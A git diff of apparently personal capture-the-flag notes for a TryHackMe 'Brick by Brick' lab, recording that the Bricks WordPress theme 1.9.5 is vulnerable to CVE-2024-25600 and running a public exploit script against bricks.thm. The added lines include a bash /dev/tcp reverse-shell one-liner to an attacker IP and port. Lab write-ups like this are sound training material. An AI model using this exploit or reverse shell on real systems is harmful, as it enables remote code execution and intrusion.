@@ -158,13 +158,16 @@ Fingerprinting the version - Time: 00:00:28 <===================================
 [+] Memory used: 227.711 MB
 [+] Elapsed time: 00:00:34
 
-### found brick theme 1.9.5 -- vulneable by CVE-2024-25600
-
+### Found Brick theme 1.9.5 -- vulneable by CVE-2024-25600
 use exploit from 
 https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
                                                                                                                     
 ┌──(duke㉿kali)-[~/Documents/THM_BrickByBrick]
 └─$ python3 CVE-2024-25600.py -u https://bricks.thm
+
+V případě rozšíření na plnohodnotný reveshell při použiti exploitu
+### bash -c 'exec bash -i &>/dev/tcp/10.9.30.202/9002 <&1'
+
 
 ### print running proccess
 
